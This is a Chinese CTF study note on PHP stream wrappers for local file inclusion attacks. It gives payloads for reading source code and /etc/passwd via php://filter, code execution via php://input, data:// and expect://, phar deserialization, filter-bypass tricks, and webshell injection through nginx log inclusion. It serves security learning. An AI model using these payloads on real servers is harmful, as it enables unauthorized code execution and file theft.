# 🗂 Web 笔记 18｜PHP 伪协议大全（LFI 利用核心）

> 记录自：qsnctf 文件包含大师（40131）｜ 2026-08-11
> 关联：Web笔记10（LFI 手册）、WP-[qsnctf]LFI日志包含蚁剑
> 一句话：伪协议 = 让 include/file_get_contents 能处理「不是普通文件的东西」

---

## 一、什么是伪协议（先建立直觉）

PHP 的「文件操作函数」（`include`、`file_get_contents`、`fopen`...）不仅能开普通文件，
还能开**「虚拟文件流」**——这些流的地址以 `协议://` 开头，叫**伪协议（wrapper）**。

```php
include("/etc/passwd");                          // 普通文件
include("php://filter/...");                     // 伪协议：打开一个「加工过的流」
include("data://text/plain,<?php ... ?>");       // 伪协议：把字符串当文件
```

**核心记忆（影响一切）**：
- `include()` = **读 + 执行**（文件里的 PHP 代码会运行）
- `file_get_contents()` = **只读**（返回文本，不执行）
- 同一个伪协议，被 include 还是被 file_get_contents，效果完全不同

---

## 二、六大常用伪协议（LFI 实战）

### ① php://filter —— 读源码（LFI 第一招 ★最常用）

**解决的问题**：include 一个 .php 文件会**执行**它，你永远看不到源码。
**思路**：用 filter 把文件内容**先加工（如 base64 编码）再 include**——base64 串不是合法 PHP，
include 时原样输出 → 你拿到源码。

**语法（一句话三件套）**：
```
php://filter/read=convert.base64-encode/resource=目标文件
            │         │                          │
            │         └ 过滤器（加工方式）        └ 要读的文件
            └ 只读模式
```

```bash
# 读 index.php 源码（base64 后手工解码）
?f=php://filter/read=convert.base64-encode/resource=index.php
```

**其他过滤器**：
| 过滤器 | 效果 |
|---|---|
| `convert.base64-encode` | base64 编码（读源码首选） |
| `string.rot13` | 字母偏移 13（也常用） |
| `zlib.inflate` | 解压（配合压缩文件） |
| 链式叠加 | `read=convert.base64-encode|convert.base64-encode`（双重，绕过滤） |

**本题实战**：`PHP://Filter/read=convert.base64-encode/resource=/etc/passwd`
（大写绕过 str_replace 小写黑名单）

### ② php://input —— 把 POST 数据当文件 ★RCE

**思路**：include(`php://input`) = 把**请求体（POST body）**当文件内容 include。
POST body 里写 PHP 代码 → include 时执行 = **RCE**。

```bash
# 需要 allow_url_include=On
curl -X POST --data "<?php system('id'); ?>" "http://靶机/?f=php://input"
```

**前提**：`allow_url_include=On`（PHP 默认 Off，测了才知道）

### ③ data:// —— 数据流注入

**思路**：把**字符串**当文件内容。
```bash
# 文本版
?f=data://text/plain,<?php system('id'); ?>
# base64 版（内容含特殊字符时更稳）
?f=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```
**前提**：`allow_url_include=On`
**实战案例**：qsnctf「穿梭隐藏的密钥」用过 `data://text/plain,MSIBLG` 喂给 file_get_contents

### ④ file:// —— 本地文件（最朴素）

```bash
?f=file:///etc/passwd        # 三个斜杠 = 协议(file://) + 绝对路径(/etc/passwd)
```
**和直接写路径等价**，但能绕过：
- 「路径必须以 / 开头」之类的检查
- 某些只认协议的函数

### ⑤ phar:// —— 反序列化（进阶）

**思路**：include(`phar://xxx.phar`) 会触发 phar 元数据的**反序列化**——
配合上传的 phar 文件可以打 PHP 反序列化（POP 链）。
```bash
?f=phar://upload/evil.phar
```
**前提**：能上传 .phar 文件（或找到现成的）

### ⑥ expect:// —— 命令执行（最猛，最少见）

```bash
?f=expect://id
```
**前提**：PHP 装了 expect 扩展（很稀有，碰到就是白给）

---

## 三、配置开关（决定哪些协议能用）

| 开关 | 默认 | 影响 |
|---|---|---|
| `allow_url_fopen` | On | file_get_contents 等能否用远程/流 |
| `allow_url_include` | **Off** | include/require 能否用 `php://input`、`data://` 等 |

**判定方法**（不用猜，试了就知道）：
- `php://filter`、`file://` 是**本地流**，不受 allow_url_include 限制 → **默认就能用** ★
- `php://input`、`data://` 需要 `allow_url_include=On` → 无输出/报错就是 Off

> 本题实测：`php://filter` 大写可用（本地流）；`data://` 无输出（allow_url_include=Off）。

---

## 四、伪协议 × include 的利用场景总表

| 场景 | 伪协议 | 效果 | 前提 |
|---|---|---|---|
| A. 读源码 | `php://filter/...resource=file.php` | 拿到 PHP 源码 | 无（本地流） |
| B. POST RCE | `php://input` | 请求体当代码执行 | allow_url_include=On |
| C. 字符串注入 | `data://text/plain,代码` | 字符串当代码执行 | allow_url_include=On |
| D. 反序列化 | `phar://upload/x.phar` | 触发 POP 链 | 有 phar 文件 |
| E. 命令执行 | `expect://命令` | 直接 RCE | expect 扩展 |
| F. 读任意文件 | `file:///路径` | 读文件 | 无 |
| G. 日志包含 | include 日志文件路径 | 执行日志里的 PHP | 能往日志写（UA） |

**场景 G 不是伪协议，但常和 A/F 配合**：先 filter 确认文件 → 再 include 执行。

---

## 五、本题实战：大小写绕过 + 日志包含的配合

```bash
# ① 验证 LFI + filter 读文件（大小写绕过 str_replace 小写黑名单）
?look=PHP://Filter/read=convert.base64-encode/resource=/etc/passwd
# → root:x:0:0:root...

# ② /flag 不存在 → 改用日志包含（伪协议之外的 LFI 玩法）
#    木马进日志（UA 注入）→ include 日志执行 → 蚁剑
?look=/var/log/nginx/access.log
```

**伪协议在这题的角色**：①的 filter 验证 + 事后读日志确认木马形态（filter 读=纯文本不执行）。

---

## 六、速查卡（贴墙）

```
读源码:    ?f=php://filter/read=convert.base64-encode/resource=index.php
           （decode base64 得源码）
POST RCE:  ?f=php://input   +  POST body=<?php system('id'); ?>   (需 allow_url_include=On)
字符串注入: ?f=data://text/plain,<?php system('id'); ?>            (同上)
读文件:    ?f=file:///etc/passwd   （= 直接写 /etc/passwd）
反序列化:  ?f=phar://upload/x.phar
命令执行:  ?f=expect://id
绕过过滤:  大小写 PHP://Filter / 双写 pphp://filter / 编码 %70hp
记忆:      filter=读源码(免费)  input/data=执行(看配置)  file=读文件  phar=反序列化
```
